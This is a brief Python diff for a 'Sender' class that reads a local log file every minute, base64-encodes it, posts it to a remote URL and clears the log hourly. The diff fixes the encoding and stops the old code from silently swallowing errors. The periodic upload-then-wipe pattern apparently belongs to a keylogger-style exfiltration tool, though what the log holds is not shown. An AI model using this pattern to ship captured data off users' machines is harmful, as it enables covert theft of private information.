@@ -10,16 +10,16 @@ class Sender():
         self.scheduler_thread = None
 
     def run_scheduler(self):
-        schedule.every().minute.do(self.collect)
+        schedule.every(1).minutes.do(self.collect)
         schedule.every().hour.do(self.clear_logs)
 
     def collect(self):
-        try:
-            with open(self.logfile, 'rb') as f:
-                encoded = base64.b64encode(f) 
-                resp = r.post(self.remote, files={'logfile.txt': encoded})
-        except:
-            pass
+        # try:
+        with open(self.logfile, 'r') as f:
+            encoded = base64.b64encode(f.read().encode("utf-8")) 
+            resp = r.post(self.remote, files={'logfile.txt': encoded})
+        # except:
+            # pass
                 
     def clear_logs(self):
         open(self.logfile, "w").close()
